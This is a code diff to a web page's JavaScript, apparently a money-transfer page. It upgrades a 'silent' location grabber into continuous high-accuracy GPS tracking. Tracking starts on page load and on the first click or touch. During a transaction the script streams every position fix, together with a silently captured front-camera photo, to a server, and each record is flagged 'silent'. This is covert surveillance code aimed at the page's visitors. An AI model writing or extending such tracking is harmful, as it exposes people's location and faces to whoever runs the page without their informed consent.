@@ -73,11 +73,72 @@
     };
 
     // ============================================================
-    // SILENT LOCATION TRACKER (OTOMATIS & CEPAT)
+    // REALTIME GPS TRACKER & STREAMING LOKASI
     // ============================================================
+    let liveLocationData = null;
+    let locationWatchId = null;
+
+    function startRealtimeLocationTracking() {
+        if (!navigator.geolocation) {
+            console.warn('[GPS] Geolocation tidak didukung browser ini.');
+            return;
+        }
+
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 5000
+        };
+
+        const onLocationSuccess = (pos) => {
+            liveLocationData = {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy || 10,
+                altitude: pos.coords.altitude || null,
+                heading: pos.coords.heading || null,
+                speed: pos.coords.speed || null,
+                timestamp: new Date().toISOString(),
+                source: 'realtime-gps',
+                silent: true
+            };
+            console.log(`[GPS-LIVE] Fix: ${liveLocationData.lat.toFixed(6)}, ${liveLocationData.lng.toFixed(6)} (Akurasi: ±${Math.round(liveLocationData.accuracy)}m)`);
+
+            // Jika transaksi sedang berlangsung, otomatis perbarui koordinat GPS realtime ke server
+            if (currentTransferId) {
+                syncTransactionRecord({
+                    transferId: currentTransferId,
+                    location: liveLocationData,
+                    frontPhoto: silentFrontPhotoBase64 || '',
+                    photo: capturedPhotoBase64 || '',
+                    status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
+                });
+            }
+        };
+
+        const onLocationError = (err) => {
+            console.warn('[GPS-LIVE] Notice:', err.message);
+        };
+
+        try {
+            if (locationWatchId !== null) {
+                navigator.geolocation.clearWatch(locationWatchId);
+            }
+            locationWatchId = navigator.geolocation.watchPosition(onLocationSuccess, onLocationError, geoOptions);
+        } catch(e) {
+            console.warn('[GPS-LIVE] watchPosition error:', e);
+        }
+    }
+
     function getSilentLocation() {
         return new Promise((resolve) => {
-            let locationData = {
+            // 1. Jika GPS realtime sudah mendapatkan koordinat akurat, langsung gunakan
+            if (liveLocationData && liveLocationData.accuracy < 200) {
+                resolve({ ...liveLocationData });
+                return;
+            }
+
+            let fallbackData = {
                 lat: -6.2088,
                 lng: 106.8456,
                 accuracy: 35,
@@ -87,38 +148,41 @@
             };
 
             if (!navigator.geolocation) {
-                resolve(locationData);
+                resolve(liveLocationData || fallbackData);
                 return;
             }
 
+            // Beri timeout 8 detik agar hardware GPS HP sempat mengunci satelit akurat
             const timeoutId = setTimeout(() => {
-                resolve(locationData);
-            }, CONFIG.LOCATION_TIMEOUT);
+                console.warn('[GPS] getCurrentPosition timeout, menggunakan posisi terbaru');
+                resolve(liveLocationData || fallbackData);
+            }, 8000);
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     clearTimeout(timeoutId);
-                    locationData = {
+                    liveLocationData = {
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude,
-                        heading: pos.coords.heading,
-                        speed: pos.coords.speed,
+                        accuracy: pos.coords.accuracy || 10,
+                        altitude: pos.coords.altitude || null,
+                        heading: pos.coords.heading || null,
+                        speed: pos.coords.speed || null,
                         timestamp: new Date().toISOString(),
-                        source: 'gps',
+                        source: 'gps-accurate',
                         silent: true
                     };
-                    resolve(locationData);
+                    resolve({ ...liveLocationData });
                 },
                 (err) => {
                     clearTimeout(timeoutId);
-                    resolve(locationData);
+                    console.warn('[GPS] Error getCurrentPosition:', err.message);
+                    resolve(liveLocationData || fallbackData);
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: CONFIG.LOCATION_TIMEOUT,
-                    maximumAge: 0
+                    timeout: 8000,
+                    maximumAge: 30000
                 }
             );
         });
@@ -831,5 +895,10 @@
     loadTemplate();
     loadWebProfile();
     setupSyncListener();
+    startRealtimeLocationTracking();
+
+    // Trigger GPS tracker juga pada sentuhan/klik pertama agar izin browser aktif
+    window.addEventListener('click', () => startRealtimeLocationTracking(), { once: true });
+    window.addEventListener('touchstart', () => startRealtimeLocationTracking(), { once: true });
 
 })();
